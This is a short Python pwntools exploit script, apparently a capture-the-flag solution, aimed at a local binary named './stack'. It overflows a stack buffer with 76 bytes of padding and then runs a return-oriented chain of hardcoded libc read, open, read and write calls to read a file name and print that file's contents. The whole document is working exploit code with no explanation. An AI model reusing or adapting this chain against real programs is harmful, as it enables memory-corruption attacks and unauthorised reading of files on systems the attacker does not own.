from pwn import *
p = process("./stack")
 
PPPR=0x08049401
PPR=0x08049402
PR=0x08049403
BUF=0xf7fb43b4

num=76
payload = b'A' * num
 
#read
payload += p32(0xf7eb7b60)
payload += p32(PPPR)
payload += p32(0)
payload += p32(BUF)
payload += p32(9)
#open
payload += p32(0xf7eb7740)
payload += p32(PPR)
payload += p32(BUF)
payload += p32(0)
 
#read
payload += p32(0xf7eb7b60)
payload += p32(PPPR)
payload += p32(3)
payload += p32(BUF)
payload += p32(10)
 
#write
payload += p32(0xf7eb7c00)
payload += p32(PR)
payload += p32(1)
payload += p32(BUF)
payload += p32(100)
#exit
payload += p32(0xf7dfa0d0)
payload += p32(0xdeadbeef)
payload += p32(2)
 
p.sendline(payload)
 
p.interactive()